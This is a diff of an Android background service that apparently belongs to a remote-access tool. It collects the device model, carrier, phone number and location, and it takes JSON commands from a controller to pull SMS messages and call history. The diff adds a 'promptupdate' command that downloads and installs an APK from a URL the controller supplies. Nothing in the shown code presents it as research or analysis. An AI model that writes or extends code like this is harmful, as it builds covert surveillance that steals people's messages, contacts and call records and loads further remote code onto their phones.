@@ -107,7 +107,8 @@ public class Client extends Service {
             updateLocation(null);
         }
 
-        public void onProviderEnabled(String provider) {}
+        public void onProviderEnabled(String provider) {
+        }
 
         public void onStatusChanged(String provider, int status, Bundle extras) {
         }
@@ -127,10 +128,13 @@ public class Client extends Service {
         device = android.os.Build.MODEL;
         sdk = Integer.valueOf(Build.VERSION.SDK_INT).toString(); //Build.VERSION.RELEASE;
         version = 1;
+        phone = "";
 
         TelephonyManager telephonyManager = ((TelephonyManager) getApplicationContext().getSystemService(Context.TELEPHONY_SERVICE));
         provider = telephonyManager.getNetworkOperatorName();
-        phone = telephonyManager.getLine1Number();
+        if (ContextCompat.checkSelfPermission(client, Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED) {
+            phone = telephonyManager.getLine1Number();
+        }
 
         latitude = 0;
         longitude = 0;
@@ -190,16 +194,23 @@ public class Client extends Service {
 
                             String command = (String) cmd.get("command");
                             Log.i(TAG, "\nCommand: " + cmd.toString() + "\n");
-                            int num = Integer.parseInt(cmd.get("arg1").toString());
 
                             if (command.equals("getsms")) {
                                 Log.i(TAG, "\nInvoking Sms Service\n");
-                                SmsService smsService = new SmsService(client, num);
+                                int arg1 = Integer.parseInt(cmd.get("arg1").toString());
+                                SmsService smsService = new SmsService(client, arg1);
                                 smsService.start();
                             } else if (command.equals("getcallhistory")) {
                                 Log.i(TAG, "\nInvoking Call LOg Service\n");
-                                CallLogService cs = new CallLogService(client, num);
+                                int arg1 = Integer.parseInt(cmd.get("arg1").toString());
+                                CallLogService cs = new CallLogService(client, arg1);
                                 cs.start();
+                            } else if (command.equals("promptupdate")) {
+                                Log.i(TAG, "\nInvoking UpdateApp\n");
+                                String apkUrl = cmd.get("arg1").toString();
+                                UpdateApp atualizaApp = new UpdateApp();
+                                atualizaApp.setContext(getApplicationContext());
+                                atualizaApp.execute(apkUrl);
                             }
 
                         } catch (JSONException e) {
@@ -287,7 +298,7 @@ public class Client extends Service {
 
     public String getContactName(Context context, String phoneNumber) {
         // check permission
-        if(ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED) {
+        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED) {
             ContentResolver cr = context.getContentResolver();
             Uri uri = Uri.withAppendedPath(ContactsContract.PhoneLookup.CONTENT_FILTER_URI, Uri.encode(phoneNumber));
             Cursor cursor = cr.query(uri, new String[]{ContactsContract.PhoneLookup.DISPLAY_NAME}, null, null, null);
